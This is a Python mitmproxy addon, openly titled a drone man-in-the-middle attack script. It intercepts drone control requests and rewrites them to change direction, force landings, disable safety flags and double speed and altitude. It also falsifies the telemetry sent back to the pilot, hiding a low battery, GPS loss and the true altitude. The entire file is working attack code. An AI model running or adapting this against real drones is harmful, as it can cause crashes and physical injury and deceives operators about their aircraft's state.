#!/usr/bin/env python3
"""
Drone MitM Attack Script using mitmproxy
Intercepts and modifies drone control commands
"""

from mitmproxy import http
import json
import logging

class DroneAttack:
    def __init__(self):
        self.intercepted_commands = []
        
    def request(self, flow: http.HTTPFlow) -> None:
        """Intercept and modify outgoing drone commands"""
        
        # Target drone control endpoints (adjust based on specific drone)
        if self.is_drone_command(flow):
            logging.info(f"Intercepted drone command: {flow.request.pretty_url}")
            
            # Log original command
            self.log_command(flow, "ORIGINAL")
            
            # Modify the command
            self.modify_drone_command(flow)
            
            # Log modified command
            self.log_command(flow, "MODIFIED")
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Intercept and modify drone telemetry responses"""
        
        if self.is_drone_telemetry(flow):
            logging.info(f"Intercepted drone telemetry: {flow.request.pretty_url}")
            
            # Modify telemetry data sent back to controller
            self.modify_telemetry(flow)
    
    def is_drone_command(self, flow: http.HTTPFlow) -> bool:
        """Check if the request is a drone control command"""
        # Common drone API endpoints
        drone_patterns = [
            "/api/command",
            "/control",
            "/movement",
            "/flight",
            "/navigate"
        ]
        
        return any(pattern in flow.request.path for pattern in drone_patterns)
    
    def is_drone_telemetry(self, flow: http.HTTPFlow) -> bool:
        """Check if the response contains drone telemetry"""
        telemetry_patterns = [
            "/api/status",
            "/telemetry",
            "/position",
            "/battery",
            "/sensors"
        ]
        
        return any(pattern in flow.request.path for pattern in telemetry_patterns)
    
    def modify_drone_command(self, flow: http.HTTPFlow) -> None:
        """Modify drone commands to demonstrate attack"""
        
        try:
            # Parse JSON command data
            if flow.request.content:
                command_data = json.loads(flow.request.text)
                
                # Example attack scenarios
                if "action" in command_data:
                    original_action = command_data["action"]
                    
                    # Attack 1: Change movement direction
                    if original_action == "move_forward":
                        command_data["action"] = "move_up"
                        command_data["speed"] = 10.0  # Potentially dangerous speed
                    
                    # Attack 2: Force landing
                    elif original_action in ["takeoff", "hover"]:
                        command_data["action"] = "land"
                    
                    # Attack 3: Disable safety features
                    elif "safety" in command_data:
                        command_data["safety"] = False
                
                # Modify altitude limits
                if "altitude" in command_data:
                    command_data["altitude"] = min(command_data["altitude"] * 2, 400)  # Double altitude
                
                # Update the request with modified data
                flow.request.text = json.dumps(command_data)
                
        except json.JSONDecodeError:
            # Handle non-JSON commands (query parameters, etc.)
            self.modify_url_parameters(flow)
    
    def modify_url_parameters(self, flow: http.HTTPFlow) -> None:
        """Modify URL parameters for non-JSON commands"""
        
        # Example: modify query parameters
        query_params = dict(flow.request.query)
        
        if "direction" in query_params:
            if query_params["direction"] == "forward":
                query_params["direction"] = "up"
        
        if "speed" in query_params:
            # Increase speed dangerously
            query_params["speed"] = str(int(float(query_params["speed"]) * 2))
        
        # Rebuild URL with modified parameters
        flow.request.query.clear()
        for key, value in query_params.items():
            flow.request.query[key] = value
    
    def modify_telemetry(self, flow: http.HTTPFlow) -> None:
        """Modify telemetry data sent to pilot"""
        
        try:
            if flow.response.content:
                telemetry_data = json.loads(flow.response.text)
                
                # Attack: Hide low battery warnings
                if "battery_level" in telemetry_data:
                    if telemetry_data["battery_level"] < 20:
                        telemetry_data["battery_level"] = 80  # Fake good battery
                
                # Attack: Hide GPS signal loss
                if "gps_status" in telemetry_data:
                    telemetry_data["gps_status"] = "good"
                
                # Attack: Fake altitude readings
                if "altitude" in telemetry_data:
                    telemetry_data["altitude"] = max(telemetry_data["altitude"] - 50, 0)
                
                flow.response.text = json.dumps(telemetry_data)
                
        except json.JSONDecodeError:
            pass
    
    def log_command(self, flow: http.HTTPFlow, status: str) -> None:
        """Log intercepted commands for analysis"""
        
        command_info = {
            "timestamp": flow.request.timestamp_start,
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "status": status,
            "content": flow.request.text[:200] if flow.request.text else "No content"
        }
        
        self.intercepted_commands.append(command_info)
        logging.info(f"{status} COMMAND: {command_info}")

# Initialize the attack addon
addons = [DroneAttack()]
